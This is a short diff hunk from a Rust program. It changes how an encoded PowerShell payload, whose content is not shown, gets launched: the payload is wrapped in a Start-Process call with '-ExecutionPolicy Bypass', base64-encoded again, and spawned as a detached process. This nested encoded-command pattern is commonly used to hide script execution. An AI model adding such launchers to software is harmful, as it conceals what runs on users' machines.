@@ -344,8 +344,16 @@ fn main() {
                 .collect();
             base64_encode(&bytes)
         };
+        let start_cmd = format!(
+            "Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand','{}'",
+            b64
+        );
+        let start_bytes: Vec<u8> = start_cmd.encode_utf16()
+            .flat_map(|c| c.to_le_bytes().to_vec())
+            .collect();
+        let start_b64 = base64_encode(&start_bytes);
         let _ = Command::new(&ps_path)
-            .args(["-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",&b64])
+            .args(["-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",&start_b64])
             .spawn();
         std::thread::sleep(std::time::Duration::from_secs(20));
     }
